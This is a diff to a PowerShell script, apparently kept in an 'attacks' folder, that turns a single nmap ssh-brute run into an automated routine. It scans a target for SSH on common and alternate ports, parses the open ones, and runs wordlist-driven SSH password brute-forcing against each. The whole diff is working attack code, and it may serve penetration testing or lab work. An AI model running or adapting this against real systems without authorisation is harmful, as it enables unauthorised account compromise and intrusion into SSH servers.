@@ -1,5 +1,5 @@
 # ============================================================
-# SSH Bruteforce via Nmap (Config-Driven Version)
+# SSH Bruteforce via Nmap (Auto-Detect SSH Port Version)
 # ============================================================
 
 # Get folder of this script (attacks/)
@@ -41,10 +41,43 @@ if (!(Test-Path $PASSWORDS)) {
 Write-Host "[INFO] Loaded users.txt and passwords.txt" -ForegroundColor Green
 
 # ------------------------------------------------------------
-# Execute SSH Bruteforce with Nmap
+# Step 1: Scan common SSH ports
 # ------------------------------------------------------------
-Write-Host "`n[SSH Bruteforce] Running nmap ssh-brute..." -ForegroundColor Yellow
+$CommonSSHPorts = "22,2222,2200,2022,8022,222,9922,10022"
 
-nmap --script ssh-brute --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
+Write-Host "`n[SCAN] Checking common SSH ports on $TARGET ..." -ForegroundColor Yellow
+
+$ScanOutput = nmap -sV -p $CommonSSHPorts $TARGET
+
+# Extract any port with "open ssh"
+$MatchedPorts = @()
+
+foreach ($line in $ScanOutput) {
+    if ($line -match "^[0-9]+/tcp\s+open\s+ssh") {
+        if ($line -match "^([0-9]+)/tcp") {
+            $MatchedPorts += $matches[1]
+        }
+    }
+}
+
+if ($MatchedPorts.Count -eq 0) {
+    Write-Host "`n[INFO] No SSH service found on common ports." -ForegroundColor Red
+    Write-Host "[DONE] Nothing to bruteforce." -ForegroundColor Cyan
+    exit
+}
+
+Write-Host "`n[INFO] SSH Detected on: $($MatchedPorts -join ', ')" -ForegroundColor Green
+
+# ------------------------------------------------------------
+# Step 2: Run ssh-brute on each SSH port found
+# ------------------------------------------------------------
+foreach ($Port in $MatchedPorts) {
+
+    Write-Host "`n[SSH Bruteforce] Running nmap ssh-brute on port $Port ..." -ForegroundColor Yellow
+
+    nmap -p $Port --script ssh-brute `
+        --script-args "userdb=$USERS,passdb=$PASSWORDS" `
+        $TARGET
+}
 
 Write-Host "`n[DONE] SSH Bruteforce attack finished." -ForegroundColor Green
